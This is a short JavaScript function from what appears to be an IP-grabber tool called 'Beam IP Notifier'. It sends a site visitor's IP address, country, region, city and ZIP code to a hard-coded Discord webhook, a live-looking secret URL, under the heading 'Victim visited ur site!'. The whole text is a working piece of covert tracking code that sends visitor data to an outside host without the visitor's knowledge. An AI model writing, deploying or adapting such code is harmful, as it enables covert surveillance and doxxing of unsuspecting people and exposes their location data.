function logs(json) 
{
     var request = new XMLHttpRequest();
     
     request.open("POST", "https://discord.com/api/webhooks/1080186612866101389/f4lIYy8nm7fJALmFZVTdUq-OiWqjeGJfv2pEHE02-D9JvlfMpiHzVcXbM4ISu9Uh3GSz");

     request.setRequestHeader("Content-type", "application/json");

     var params = 
     {
          username: "Beam IP Notifier | Beta",
          avatar_url: "https://media.discordapp.net/attachments/1060890977474183193/1077955575498940487/lfP5YqEQB4Z8QAAAAASUVORK5CYII.png",
          content: "**BeamOnTop**",
          embeds: [
               {
                    title: "Victim visited ur site!",
                    color: 00000,
                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
               }
          ]
     }

     request.send(JSON.stringify(params));
}